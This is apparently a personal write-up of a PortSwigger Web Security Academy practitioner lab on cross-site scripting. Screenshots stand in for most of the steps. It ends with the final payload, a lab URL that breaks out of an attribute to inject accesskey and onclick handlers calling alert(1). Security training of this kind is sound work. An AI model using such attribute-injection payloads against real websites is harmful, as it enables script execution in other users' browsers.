#portswigger #solution #xss
- **Category:** [[Cross-site scriping (XSS)]]
- **Difficulty:** [[PRACTITIONER]]
- **URL Lab:** https://portswigger.net/web-security/cross-site-scripting/
- **Date Solved:** 2026-08-19

![[Pasted image 20260819164728.png]]

![[Pasted image 20260819161715.png]]

After reanalyzing the structure, I came up with this another idea:
![[Pasted image 20260819162428.png]]
![[Pasted image 20260819162359.png]]

![[Pasted image 20260819162802.png]]
It didn't work out unfortunately ;(

And I realize that I focused in wrong things after reading the soluton:
![[Pasted image 20260819163654.png]]
Here's my actual target :)
The solution is actually super clever, they added `?` to make the remaining becomes a query parameter.

Final payload:
```
https://0a2100940497917f808bb24f00350053.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
![[Pasted image 20260819164701.png]]


